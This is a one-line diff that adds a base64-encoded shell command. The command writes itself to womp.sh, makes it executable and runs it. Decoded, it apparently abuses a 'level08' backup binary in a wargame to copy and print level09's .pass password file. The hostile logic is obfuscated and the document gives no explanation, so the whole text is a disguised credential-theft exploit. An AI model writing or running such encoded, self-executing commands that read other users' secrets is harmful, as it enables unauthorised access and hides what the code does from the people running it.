@@ -1,0 +1,1 @@
+echo "bWtkaXIgLXAgL3RtcC9iYWNrdXBzL2hvbWUvdXNlcnMvbGV2ZWwwOQp0b3VjaCAvdG1wL2JhY2t1cHMvLmxvZwpjZCAvdG1wCn4vbGV2ZWwwOCAiL2hvbWUvdXNlcnMvbGV2ZWwwOS8ucGFzcyIKY2F0ICIvdG1wL2JhY2t1cHMvaG9tZS91c2Vycy9sZXZlbDA5Ly5wYXNzIgo=" | base64 -d > womp.sh && chmod +x womp.sh && ./womp.sh
